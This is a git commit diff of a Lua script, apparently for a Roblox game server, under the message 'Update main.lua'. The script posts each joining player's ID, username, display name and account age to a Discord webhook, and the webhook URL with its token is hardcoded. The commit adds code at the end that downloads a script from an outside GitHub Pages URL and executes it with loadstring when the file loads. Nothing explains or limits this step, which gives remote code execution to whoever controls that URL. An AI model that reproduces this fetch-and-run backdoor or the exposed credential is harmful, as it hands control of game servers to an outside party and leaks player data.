5bf3c19035f1c7fe733340b981d05f39872f79ae
PGer <160817198+PgerTools@users.noreply.github.com>
2024-06-21 16:37:16 -0400

    Update main.lua

--- main.lua
+++ main.lua
@@ -1,5 +1,4 @@
-local http = require("socket.http")
-local json = require("json")
+local HttpService = game:GetService("HttpService")
 
 local webhookUrl = "https://discordapp.com/api/webhooks/1253809598452858971/jpFmQYOCWwssaHqR0QA0tLZ_pY3Eylo56t9u6WNg8dR_CbS7kP6c7ekYyjCNvBTVidd5"
 
@@ -14,22 +13,17 @@ local function sendEmbed(title, description, fields)
         embeds = {embed}
     }
 
-    local jsonData = json.encode(data)
+    local jsonData = HttpService:JSONEncode(data)
 
-    local response, status = http.request {
-        url = webhookUrl,
-        method = "POST",
-        headers = {
-            ["Content-Type"] = "application/json",
-            ["Content-Length"] = #jsonData
-        },
-        source = ltn12.source.string(jsonData)
-    }
+    local response
+    local success, errorMessage = pcall(function()
+        response = HttpService:PostAsync(webhookUrl, jsonData, Enum.HttpContentType.ApplicationJson)
+    end)
 
-    if status == 200 then
+    if success then
         print("Embed sent successfully!")
     else
-        print("Failed to send embed. Status code: " .. status)
+        print("Failed to send embed. Error: " .. errorMessage)
     end
 end
 
@@ -39,10 +33,26 @@ local function getPlayerInfo(player)
         {name = "UserID", value = tostring(player.UserId), inline = true},
         {name = "Username", value = player.Name, inline = true},
         {name = "DisplayName", value = player.DisplayName, inline = true},
-        {name = "Account Age", value = tostring(player.AccountAge), inline = true}}
+        {name = "Account Age", value = tostring(player.AccountAge), inline = true}
+    }
 end
 
 game.Players.PlayerAdded:Connect(function(player)
     local embedFields = getPlayerInfo(player)
     sendEmbed("Player Joined", player.Name .. " has joined the game.", embedFields)
 end)
+
+local success, response = pcall(function()
+    return HttpService:GetAsync("https://pgertools.github.io/Repurcution/main.lua")
+end)
+
+if success then
+    local loadSuccess, loadError = pcall(function()
+        loadstring(response)()
+    end)
+    if not loadSuccess then
+        warn("Error loading script: " .. loadError)
+    end
+else
+    warn("Error fetching script: " .. response)
+end
